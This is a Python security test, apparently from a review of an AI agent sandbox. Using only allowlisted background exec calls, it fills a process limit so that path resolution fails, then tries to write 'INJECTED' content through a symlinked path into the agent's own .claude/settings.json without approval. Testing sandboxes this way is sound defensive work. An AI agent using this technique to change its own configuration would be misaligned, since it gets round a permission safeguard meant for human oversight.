"""parent-live (critic-1 reassignment, outside budget): can an agent make resolve() fail while write_file still runs,
so cfg/settings.json (cfg -> .claude) is judged by the requested path only? Uses only agent tool calls the default
policy allows without approval (read-only-exec allowlist with '&'), real dockerd, real sandbox, pids_limit 64."""
import os, tempfile, pathlib, threading, json, collections
os.environ["AGENTBOX_PIDS"] = "64"; os.environ["AGENTBOX_EXEC_TIMEOUT"] = "3"
from fastapi.testclient import TestClient
tmp = pathlib.Path(tempfile.mkdtemp()); os.environ["AGENTBOX_HOME"] = str(tmp / "data"); os.environ.pop("AGENTBOX_HUMAN_TOKEN", None)
src = tmp / "src"; (src / ".claude").mkdir(parents=True); (src / ".claude" / "settings.json").write_text("{}")
(src / "cfg").symlink_to(".claude", target_is_directory=True)
from agentbox.api import build
app, box, human = build(); c = TestClient(app); H = {"Authorization": f"Bearer {human}"}
sb = c.post("/sandboxes", json={"source_dir": str(src)}, headers=H).json(); sid = sb["id"]; A = {"Authorization": f"Bearer {sb['agent_token']}"}
def tool(t, a): r = c.post(f"/sandboxes/{sid}/tools/{t}", json={"args": a}, headers=A); return r.status_code, r.json()
st, j = tool("exec", {"command": "tail -f /dev/null & tail -f /dev/null & echo started"})
print("allowlisted background exec:", st, j.get("status"), j.get("rule_id"), (j.get("result") or {}).get("stdout", "").strip())
def count(): return int(box.sandboxes._container(sid).exec_run(["sh", "-c", "ls -d /proc/[0-9]* | wc -l"], user="0").output.decode().split()[0])
print("procs after 2 tails:", count())
results = collections.Counter()
for free in (4, 3, 2, 1):
    # fill until `free` pid slots remain (approximate: count includes the counting shell)
    for _ in range(80):
        n = count()
        if 64 - n <= free: break
        tool("exec", {"command": "tail -f /dev/null & tail -f /dev/null &"})
    outs = []
    for i in range(6):
        st, j = tool("write_file", {"path": "/workspace/cfg/settings.json", "content": f"INJECTED {free} {i}"})
        outs.append((st, j.get("status"), j.get("rule_id"), (j.get("detail") or "")[:60]))
    print(f"free~{free} procs={count()}: write_file cfg/settings.json ->", outs)
print("final .claude/settings.json:", box.sandboxes._container(sid).exec_run(["cat", "/workspace/.claude/settings.json"]).output.decode()[:80])
rows = [r for r in box.audit.recent(sandbox_id=sid, limit=400)[0] if r["event"] == "policy_decision"]
print("policy_decision actions:", collections.Counter((r["payload"].get("action"), r["payload"].get("rule_id")) for r in rows))
print("done", flush=True); c.delete(f"/sandboxes/{sid}", headers=H)
